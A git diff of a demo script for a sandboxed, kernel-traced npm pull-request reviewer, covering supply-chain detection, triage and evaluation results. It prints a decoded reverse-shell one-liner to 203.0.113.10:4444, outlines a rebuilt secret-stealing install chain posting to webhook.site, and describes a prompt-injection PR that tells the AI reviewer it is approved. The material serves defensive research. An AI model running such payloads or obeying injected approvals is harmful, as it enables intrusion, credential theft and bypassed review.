@@ -3,75 +3,87 @@
 Everything shown is real: real GitHub PRs on
 [pr-detonator-demo/demo-target](https://github.com/pr-detonator-demo/demo-target/pulls), a
 real Chamber VM with eBPF tracing, and real Meta models. Record with the PR tabs pre-opened;
-each check takes 30–60 s, so trigger fresh runs before recording (push an empty commit to
-each branch) and show the finished results.
+each check takes 30–60 s, so trigger fresh runs before recording (push an empty commit to each
+branch) and show the finished results. Have `eval/SWEEP.md`, `eval/DWELL_TIME.md`,
+`eval/BASELINE.md` and the dashboard open in tabs.
 
-## 0:00 – 0:20 · The problem
+## 0:00 – 0:25 · Cold open: a real finding
 
-> "In 2025 a worm called Shai-Hulud spread through hundreds of npm packages. It got in
-> through ordinary version bumps, ran at `npm install`, and stole every secret it could
-> find. Code review didn't catch it: the PR diff was one line. So we built a reviewer that
-> doesn't read the code. It **runs** it."
+> "This is a tool that reviews pull requests by *running* them. To test it, I pointed it at
+> a hundred npm packages published in the last few minutes — packages nobody had vetted. It
+> cleared the ones that installed, and flagged one. That one, during install, connected to a
+> hardcoded IP address with TLS verification turned off and ran whatever came back. It isn't
+> malware — it's a real package with an unsafe fallback — but no advisory existed, nobody
+> told us to look, and the behavior alone gave it away. That's the whole idea."
 
-Show: [PR #12](https://github.com/pr-detonator-demo/demo-target/pull/12), "Bump color-helper
-from 1.0.0 to 1.0.1", a Dependabot-style one-line diff.
+Show `eval/SWEEP.md` (the finding row) briefly. Don't name the package on camera (disclosure
+pending).
 
-## 0:20 – 1:00 · The dependency did it (E8)
+## 0:25 – 0:45 · Why this, why now
 
-1. Scroll to the check: **🛑 Blocked**. Merge button disabled (branch protection).
-2. Open **Files changed**: the inline comment sits on the bumped line and names
-   **color-helper**: "this line brings in the dependency color-helper, whose install script
-   ran during `npm install` and triggered `NET_RAW_IP`".
-3. In the report: *Packages that ran install scripts* → 🛑 dependency color-helper.
+> "Supply-chain attacks run at `npm install`, before anyone imports a line of code — and they
+> arrive as one-line version bumps, so there's nothing in the diff to review. And now AI
+> agents are opening those PRs and picking the dependencies. Something has to check what the
+> agent just installed. We do it by running it in a sandbox and watching the kernel."
 
-> "The author is innocent. The kernel recorded that npm ran color-helper's install script,
-> and that script opened a socket. We blame the exact line that brought it in."
+One line on the architecture: **the model predicts, the kernel verifies, rules set the floor.**
 
-## 1:00 – 1:30 · We rebuilt Shai-Hulud (eval case r02)
+## 0:45 – 1:25 · The dependency did it (E8)
 
-Show the eval table's incident rows and the real detonation (`eval/results.md`, scored at
-`00b06f7`): postinstall → `node bundle.js` → downloads the *real* TruffleHog from GitHub →
-runs it from `/tmp` → POSTs to webhook.site.
+[PR #12](https://github.com/pr-detonator-demo/demo-target/pull/12), "Bump color-helper from
+1.0.0 to 1.0.1" — a Dependabot-style one-line diff.
+1. The check is **🛑 Blocked**; merge disabled by branch protection.
+2. **Files changed**: inline comment on the bumped line, naming **color-helper**.
+3. The report's *Where it came from* points **inside the dependency** —
+   `node_modules/color-helper/install.js`, with the line decoded by Muse and a sha256.
+4. *Compared to the base branch* → **New at install: `tcp:203.0.113.10:4444`** (differential).
 
-> "Before we rebuilt it, our rules only said 'needs review': GitHub is allowlisted and
-> webhook.site is just a domain. Rebuilding the real attack showed the gap, and two
-> kernel-level rules closed it: running a dropped binary, and talking to an exfil service.
-> And the Chamber sinkholes those services, so even a working payload leaks nothing."
+> "The author is innocent — it's a version bump. The kernel recorded that the dependency's
+> install script opened a socket, we captured the file out of the sandbox, and the model
+> decoded the exact line. Differential detonation shows this is new versus the old version."
 
-## 1:30 – 2:00 · Obfuscation decoded on the line (E5)
+## 1:25 – 1:50 · Obfuscation decoded, and it can't be fooled (E5 + E6)
 
-[PR #8](https://github.com/pr-detonator-demo/demo-target/pull/8): inline comment on
-`scripts/telemetry-optout.js` line 8. Muse decoded the base64 to
-`bash -i >& /dev/tcp/203.0.113.10/4444 0>&1`.
+- [PR #8](https://github.com/pr-detonator-demo/demo-target/pull/8): inline comment on the
+  `cp.spawn` line; Muse decoded the base64 to `bash -i >& /dev/tcp/203.0.113.10/4444 0>&1`.
+- [PR #9](https://github.com/pr-detonator-demo/demo-target/pull/9): the PR text tells the AI
+  reviewer it's approved.
 
-> "Deterministic code finds the line; the Meta model explains it in plain English."
+> "Muse flags the injection itself — but even if it were fooled, model output can only raise
+> severity, never clear a kernel fact. Prompt Guard 2 runs too; we measured it, it catches
+> blunt jailbreaks but not this kind, which is exactly why the floor isn't a model."
 
-## 2:00 – 2:25 · It can't be talked out of it (E6)
+## 1:50 – 2:15 · It triages instead of crying wolf (E9)
 
-[PR #9](https://github.com/pr-detonator-demo/demo-target/pull/9): the PR body and
-package.json tell the AI reviewer the PR is approved.
+[PR #13](https://github.com/pr-detonator-demo/demo-target/pull/13), "Add PDF export with
+puppeteer" → **⚠️ Needs review**. Show the **Triage** section: the investigator agent made 4
+tool calls and wrote *"puppeteer, published 2013, maintainers unchanged, install.mjs only
+calls downloadBrowsers(); storage.googleapis.com is a known package CDN."*
 
-> "Muse flags the injection itself. And even if it believed it, the model can only escalate:
-> the kernel facts set a floor it can't lower. Prompt Guard 2 runs too: we measured it, it
-> catches explicit jailbreaks but not this kind, which is exactly why the floor exists."
+> "A real package that downloads a browser lands on 'needs review', not blocked. The agent
+> does the first pass of the human's homework — registry age, maintainer changes, the actual
+> script — and can escalate but never clear."
 
-## 2:25 – 2:45 · And it doesn't cry wolf
+## 2:15 – 2:40 · The evidence
 
-Show the eval table: 26 popular packages with install-time downloads (puppeteer, electron,
-prisma, cypress, …): **0 blocked**. 15 of 15 simulated attacks and both real-incident
-reconstructions blocked.
+Flash three things:
+- **0 false blocks** across 100 uncurated live packages (`eval/SWEEP.md`) and 104 popular ones.
+- **`npm audit` says "0 vulnerabilities"** on the same attacks it hasn't seen yet
+  (`eval/BASELINE.md`); dwell time of real incidents was hours to months (`eval/DWELL_TIME.md`).
+- The **dashboard** and its **behavior atlas** — what each package did at install.
 
-> "Muse predicts what the PR should do *before* it runs, from the title and description
-> only. Code checks the prediction against the kernel. That's how prisma's engine download
-> gets cleared and the attacks don't."
+> "Advisory tools are retrospective — they protect you from last year's attack. This catches
+> behavior the first time it runs, in seconds, at about a cent and a half per PR."
 
-## 2:45 – 3:00 · Where this goes
+## 2:40 – 3:00 · Where this goes
 
-> "Every new version of the top npm packages, detonated minutes after publish. A signed
-> record of what each version does at install, a behavioral SBOM. Lockfiles pin bytes; this
-> pins behavior."
+> "Detonate every new npm release minutes after publish, and diff its behavior against the
+> last version — 'this release started reading your npmrc' as an alert, not a GHSA days later.
+> We already emit a signed, per-version behavioral record for exactly that. Lockfiles pin
+> bytes; this pins behavior."
 
 ## Fallbacks
 
 - If a live check is slow, show the already-completed run on the same PR.
-- If the Chamber is down: the PR comments and inline reviews stay on GitHub as evidence.
+- If the Chamber is down, the PR comments and inline reviews stay on GitHub as evidence.
+- Keep the package name in the cold open **unspoken** until the maintainer has been notified.
